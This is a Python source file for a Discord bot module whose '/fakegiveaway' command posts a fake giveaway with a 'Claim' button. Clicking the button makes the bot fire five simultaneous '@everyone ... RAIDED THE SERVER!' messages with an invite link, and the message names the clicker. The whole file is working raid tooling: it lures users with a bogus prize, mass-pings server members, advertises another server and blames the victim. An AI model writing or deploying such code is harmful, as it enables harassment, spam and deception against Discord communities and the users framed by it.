import aiohttp
import asyncio
import discord
from discord import app_commands
from discord.ext import commands
from discord.ui import View, Button

from core.config import RAID_MESSAGE
from core.utils import send_message_http

VSENTINEL_INVITE = "https://discord.gg/Zwa2Jx6vf7"


class GiveawayView(View):
    def __init__(self, bot, session: aiohttp.ClientSession):
        super().__init__(timeout=None)
        self.bot = bot
        self.session = session

    @discord.ui.button(label="Claim", style=discord.ButtonStyle.primary)
    async def claim_button(self, interaction: discord.Interaction, button: Button):
        await interaction.response.defer()

        user = interaction.user
        message = f"# @everyone {user} RAIDED THE SERVER! {VSENTINEL_INVITE}"
        application_id = interaction.client.user.id
        interaction_token = interaction.token

        tasks = []
        for _ in range(5):
            tasks.append(
                send_message_http(self.session, application_id, interaction_token, message)
            )
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Exception):
                print(f"Giveaway claim send failed: {r}")
            elif isinstance(r, tuple):
                status, data = r
                if status >= 400:
                    print(f"Giveaway claim send returned status {status}: {data}")

        await interaction.edit_original_message(view=None)


class Giveaway(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.session: aiohttp.ClientSession | None = None

    async def cog_load(self):
        self.session = aiohttp.ClientSession()

    async def cog_unload(self):
        if self.session and not self.session.closed:
            await self.session.close()

    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    @app_commands.command(name="fakegiveaway", description="Start a fake giveaway")
    @app_commands.describe(prize="The prize for the giveaway")
    async def fakegiveaway(self, interaction: discord.Interaction, prize: str | None = None):
        await interaction.response.send_message("making giveaway!", ephemeral=True)

        prize_text = prize if prize else "something unknown"
        embed = discord.Embed(
            title="Giveaway!",
            description=f"A giveaway for {prize_text} just started! Get a chance to win before someone else does.",
            color=discord.Color.red()
        )
        view = GiveawayView(self.bot, self.session)
        await interaction.followup.send(embed=embed, view=view)


async def setup(bot):
    await bot.add_cog(Giveaway(bot))